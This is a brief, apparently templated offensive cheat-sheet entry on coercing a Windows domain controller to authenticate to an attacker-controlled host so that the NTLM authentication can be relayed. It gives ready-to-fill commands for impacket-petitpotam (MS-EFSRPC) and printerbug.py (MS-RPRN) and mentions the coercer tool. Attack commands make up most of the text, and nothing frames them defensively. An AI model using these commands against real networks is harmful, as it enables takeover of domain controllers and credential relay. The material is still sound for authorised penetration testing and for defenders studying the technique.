Force a machine — ideally a DC — to authenticate to a host you control, then
relay that auth (see `ntlm-relay-ntlmrelayx`). PetitPotam abuses MS-EFSRPC,
printerbug the MS-RPRN spooler; `coercer` sprays many vectors at once. Here
`{{rhost}}` is the DC being coerced and `{{lhost}}` is your listener.

```sh
impacket-petitpotam {{lhost}} {{rhost}}
printerbug.py {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
```
